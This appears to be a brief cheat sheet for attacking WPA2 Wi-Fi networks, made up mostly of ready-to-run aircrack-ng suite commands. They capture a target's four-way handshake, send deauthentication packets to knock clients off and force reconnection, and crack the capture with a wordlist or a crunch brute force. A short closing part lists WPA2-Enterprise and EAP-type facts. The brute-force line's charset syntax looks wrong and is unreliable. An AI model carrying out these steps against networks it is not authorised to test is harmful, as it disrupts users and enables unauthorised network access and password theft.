### General information
```
4 way handshake for authentiation
every user get single session (Pairwise Transient key - PTK, calculated from Pairwise Master Key - PMK)
replay protected
```

### Capture handshake
```
airmon-ng check
airmon-ng check kill
airmon-ng start <interface>
airodump-ng <interface> --bssid <bssid> --channel <channel> --write <file>
```

### If there are some problems starting the interface you can try
```
rfkill unblock all
```

### Send deauthenticate packets
```
aireplay-ng --deauth 5 -a <bssid> <interface>
```
 
### Crack captured handshake using wordlist
```
aircrack-ng <file>.cap -w <wordlist>
```

### Bruteforce captured handshake
```
crunch 8 10 [a-z;A-Z;0-9] | aircrack-ng <file>.cap -b <bssid> -w-
```
 
### General information about WPA2-Enterprise
```
No global key
Radius server used for authentication
```

### EAP-Types (without outer tunnel):
```
EAP-MD5
EAP-LEAP
```

### EAP-Types (with outer tunnel):
```
EAP-FAST
PEAP
EAP-TLS
```

